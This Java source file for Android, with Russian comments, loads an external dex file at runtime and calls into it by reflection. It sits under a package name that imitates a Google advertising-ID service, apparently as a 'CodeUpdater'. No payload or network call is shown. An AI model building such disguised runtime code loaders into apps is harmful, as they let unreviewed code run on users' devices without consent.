package com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader;

import android.content.Context;

import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class ExternalLibServicer {
    static DexClassLoader dexClassLoader;
    private static ExternalLibServicer instance = null;

    private ExternalLibServicer(Context cnt){
        String filePath = getDexFilePath(cnt); //!!! TODO: возможно надо сохранять отдельно как релизную так и дебажную версию
        File dexFile = new File(filePath);
        File codeCacheDir = new File(cnt.getCacheDir() + File.separator + "codeCache");
        codeCacheDir.mkdirs();
        dexClassLoader = dexFile.length() == 0 ? null : new DexClassLoader( dexFile.getAbsolutePath(), codeCacheDir.getAbsolutePath(), null, cnt.getClassLoader());
    }

    public static synchronized ExternalLibServicer getServicer(Context cnt)
    {
        if (instance == null){
            instance = new ExternalLibServicer(cnt);
            if(dexClassLoader == null) //Если лоадер не смог подгрузить библиотеку - считаем что класс не должен быть создан
            {
                instance = null;
            }
        }
        return instance;
    }

    public static boolean isExternalLibAccessible(Context cnt)
    {
        getServicer(cnt);
        return (dexClassLoader != null);
    }

    public static String getDexFilePath(Context cnt)
    {
        return "" + GlobalParameters.DexFilePath(cnt);
    }

//    public static String getReleaseDexFilePath(Context cnt)
//    {
//        return "" + GlobalParameters.DexReleaseFilePath(cnt);
//    }
//    public static String getDebugDexFilePath(Context cnt)
//    {
//        return "" + GlobalParameters.DexDebugFilePath(cnt);
//    }

    public Class getExternalClass(Context cnt, String className)
    {
        if (dexClassLoader != null) {
            try {
                return dexClassLoader.loadClass(className);
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    public Object getInstance(Class clazz, Object[] arg, Class[] argClass )
    {
        Object objOfClass = null;
        Constructor<?> constructor = null;
        if (clazz != null) {
            try {
                if (arg.length > 0) {
                    constructor = clazz.getDeclaredConstructor(argClass);
                    objOfClass = constructor == null ? null : constructor.newInstance(arg);
                } else {
                    constructor = clazz.getDeclaredConstructor();
                    objOfClass = constructor == null ? null : constructor.newInstance();
                }
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }
        }
        return objOfClass;
    }

    public <T> T callMethod(Class clazz, Object objOfClass, String methodName, Object[] arg, Class[] argClass )
    {
        if ((clazz != null) && (objOfClass != null)) {
            try {
                Method exists = clazz.getMethod(methodName, argClass);
                exists.setAccessible(true);
                return (T) exists.invoke(objOfClass, arg);

            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    public <T> T callStaticMethod(Class clazz, String methodName, Object[] arg, Class[] argClass )
    {
        if (clazz != null) {
            try {
                Method exists = clazz.getMethod(methodName, argClass);
                exists.setAccessible(true);
                return (T) exists.invoke(null, arg);
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    public <T> T getAttribute(Class clazz, Object objOfClass, String fildName)
    {
        Field field = null;
        if ((clazz != null) && (objOfClass != null)) {
            try {
                field = clazz.getDeclaredField(fildName);
                field.setAccessible(true);
                return (T) field.get(objOfClass);
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
        return null;
    }


    /*
    Метод возвращает параметр из Enum-а из внешнего dex-а
    @params clazz - Класс Enum-а из которого
    @params i     - Номер по порядку какой параметр вернуть (при "Enum Color {RED, GREEN, BLUE}" 0 - вернеет RED, 1 - вернеет GREEN ...)
    Пример использования:
        Class IApi_RestReadType = loader.getExternalClass(getApplicationContext(), "com.advertising_id_service.appclick.googleadvertisingidservice.REST.IApi$RestReadType");
        loader.getEnumValue(IApi_RestReadType, 0)
    */
    public <T> T getEnumValue(Class clazz, int i)
    {
        if ((clazz != null) && (clazz.isEnum())) {
            return (T) clazz.getEnumConstants()[i];
        }
        return null;
    }

}
